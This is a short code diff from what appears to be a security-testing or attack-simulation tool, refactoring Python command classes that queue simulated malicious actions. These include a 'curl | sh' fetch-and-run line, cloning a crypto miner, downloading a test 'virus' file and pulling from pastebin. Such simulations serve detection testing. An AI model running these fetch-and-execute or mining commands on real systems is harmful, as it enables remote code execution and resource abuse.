@@ -7,7 +7,7 @@ class DownloadFileThenRun(ICommand):
     def Execute(self):
         if self.CheckHelpRequested():
             return
-        self.context.EnqueueCommandsNext(["custombash curl google.com | sh"])
+        self.context.CommandQueue.EnqueueCommandsNext(["custombash curl google.com | sh"])
 
     def HelpRequested(self):
         return PrintAndLog("\n"
@@ -19,7 +19,7 @@ class CryptoMiner(ICommand):
     def Execute(self):
         if self.CheckHelpRequested():
             return
-        self.context.EnqueueCommandsNext(["gitclone https://github.com/cpuminer"])
+        self.context.CommandQueue.EnqueueCommandsNext(["gitclone https://github.com/cpuminer"])
 
     def HelpRequested(self):
         return PrintAndLog("\n"
@@ -31,7 +31,7 @@ class DownloadVirusFile(ICommand):
     def Execute(self):
         if self.CheckHelpRequested():
             return
-        self.context.EnqueueCommandsNext(["createfiles -d ~/AriotsTemp/virus",
+        self.context.CommandQueue.EnqueueCommandsNext(["createfiles -d ~/AriotsTemp/virus",
                                           "downloadfile ~/AriotsTemp/virus/virus.txt "
                                           "https://raw.githubusercontent.com/YuvalFeldman/AttackAgentGetFile/master/virus.txt"])
 
@@ -46,7 +46,7 @@ class PossibleMalware(ICommand):
     def Execute(self):
         if self.CheckHelpRequested():
             return
-        self.context.EnqueueCommandsNext(["retrievefile pastebin.com"])
+        self.context.CommandQueue.EnqueueCommandsNext(["retrievefile pastebin.com"])
 
     def HelpRequested(self):
         return PrintAndLog("\n"
